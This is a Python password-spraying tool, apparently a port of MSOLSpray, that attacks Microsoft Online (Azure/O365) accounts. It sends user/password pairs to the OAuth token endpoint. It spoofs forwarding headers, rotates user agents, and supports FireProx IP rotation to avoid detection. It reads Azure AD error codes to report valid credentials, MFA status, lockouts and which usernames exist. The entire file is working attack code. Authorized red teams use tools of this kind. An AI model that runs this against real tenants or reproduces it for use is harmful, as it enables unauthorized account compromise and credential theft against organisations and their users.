import requests
import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import random
import queue


description = """
This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him! Python port credits go to MartinIngesen (@Mrtn9)

This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020

This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
"""

q = queue.Queue()
force = False
lockout_counter = 0
lockedout = False
useragents = []
username_counter = 0
username_count = 0
results = ""

def main():

    global force, username_count, useragents

    parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument("-u", "--userlist", metavar="FILE", required=True, help="File filled with usernames one-per-line in the format 'user@domain.com'. (Required)")
    parser.add_argument("-p", "--password", help="A single password that will be used to perform the password spray")
    parser.add_argument("-pf", "--passwordfile", help="File containing multiple passwords to spray, will spray one after they other if no delay is set")
    parser.add_argument("-a", "--useragentfile", metavar="FILE", required=False, help="File containing a list of useragents for random selection")
    parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output valid results to.")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use. Will make throttle quicker if not used with FireProx")
    parser.add_argument("-d", "--delay", type=int, help="Number of minutes to wait between unique passwords, allows password lockout policy to reset")
    parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
    parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")

    args = parser.parse_args()

    url = args.url
    force = args.force
    out = args.out
    verbose = args.verbose
    threads = args.threads
    delay = args.delay

    usernames = []
    with open(args.userlist, "r") as userlist:
        usernames = userlist.read().splitlines()

    username_count = len(usernames)

    if args.useragentfile is not None:
        with open(args.useragentfile, 'r') as agentlist:
            useragents = agentlist.read().splitlines()

    if not args.password == None:
        passwords = [args.password]
    elif not args.passwordfile == None:
        passwords = open(args.passwordfile,'r').read().splitlines()
    else:
        print("Either password or passwordfile flag required")
        exit()

    print(f"There are {username_count} users in total to spray,")
    print("Now spraying Microsoft Online.")
    print(f"Current date and time: {time.ctime()}")

    for password in passwords:

        for user in usernames:
            cred = {}
            cred['username'] = user
            cred['password'] = password
            q.put(cred)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(0,threads):
                executor.submit(
                    spray_thread,
                    url=url,
                    verbose=verbose
                )

        if lockedout:
            print("WARNING! Lockout counter limit met, exiting spray. To force continuation, use the -f/--force flag")
            break

        if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
            continue
        else:
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(f"Completed password {password} at {current_time}, sleeping for {delay} minutes before next password spray")
            time.sleep(delay * 60)

    if out and results != "":
        with open(out, 'w') as out_file:
            out_file.write(results)
            print(f"Results have been written to {out}.")


def spray_thread(url, verbose):

    global username_counter, username_count, lockedout

    while not q.empty():

        if (force == False and lockout_counter >= 10) or lockedout:
            lockedout = True
            break

        username_counter = username_counter + 1
        print(f"{username_counter} of {username_count} users tested", end="\r")

        cred = q.get_nowait()

        msol_authenticate(
            username = cred['username'],
            password = cred['password'],
            url = url,
            verbose = verbose
        )

        q.task_done()


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def msol_authenticate(username, password, url, verbose):

    global results, lockout_counter, useragents

    body = {
        'resource': 'https://graph.windows.net',
        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
        'client_info': '1',
        'grant_type': 'password',
        'username': username,
        'password': password,
        'scope': 'openid',
    }

    spoofed_ip = generate_ip()
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        "X-My-X-Forwarded-For" : spoofed_ip,
        "x-amzn-apigateway-api-id" : amazon_id,
        "X-My-X-Amzn-Trace-Id" : trace_id
    }

    if useragents != []:
        headers['User-Agent'] = random.choice(useragents)

    r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)

    if r.status_code == 200:
        print(f"SUCCESS! Code: {r.status_code} {username} : {password}")
        results += f"{username} : {password}\n"
    else:
        resp = r.json()
        error = resp["error_description"]

        if "AADSTS50126" in error:
            if verbose:
                print(f"VERBOSE: Code: {r.status_code} Invalid username or password. Username: {username} could exist.")

        elif "AADSTS50128" in error or "AADSTS50059" in error:
            print(f"WARNING! Code: {r.status_code} Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")

        elif "AADSTS50034" in error:
            print(f"WARNING! Code: {r.status_code} The user {username} doesn't exist.")

        elif "AADSTS50079" in error or "AADSTS50076" in error:
            # Microsoft MFA response
            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
            results += f"{username} : {password}\n"

        elif "AADSTS50158" in error:
            # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
            results += f"{username} : {password}\n"

        elif "AADSTS50053" in error:
            # Locked out account or Smart Lockout in place
            print(f"WARNING! Code: {r.status_code} The account {username} appears to be locked.")
            lockout_counter += 1

        elif "AADSTS50057" in error:
            # Disabled account
            print(f"WARNING! Code: {r.status_code} The account {username} appears to be disabled.")

        elif "AADSTS50055" in error:
            # User password is expired
            print(f"SUCCESS! Code: {r.status_code} {username} : {password} - NOTE: The user's password is expired.")
            results += f"{username} : {password}\n"

        else:
            # Unknown errors
            print(f"Code: {r.status_code} Got an error we haven't seen yet for user {username}")
            print(error)


if __name__ == '__main__':
    main()
